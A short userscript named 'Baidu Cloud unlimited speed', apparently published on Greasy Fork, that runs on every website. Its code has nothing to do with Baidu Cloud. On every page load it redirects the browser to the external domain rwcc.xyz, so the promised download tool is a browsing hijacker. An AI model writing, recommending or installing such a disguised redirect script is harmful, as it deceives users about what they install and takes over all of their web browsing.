// ==UserScript==
// @name         百度云不限速
// @namespace    your-namespace
// @version      1.0
// @description  不要下载，看简介
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/478458/%E7%99%BE%E5%BA%A6%E4%BA%91%E4%B8%8D%E9%99%90%E9%80%9F.user.js
// @updateURL https://update.greasyfork.org/scripts/478458/%E7%99%BE%E5%BA%A6%E4%BA%91%E4%B8%8D%E9%99%90%E9%80%9F.meta.js
// ==/UserScript==

(function() {
    'use strict';
    
    // 在页面加载完成后触发
    window.onload = function() {
        // 跳转到rwcc.xyz
        window.location.href = 'https://rwcc.xyz';
    };
})();
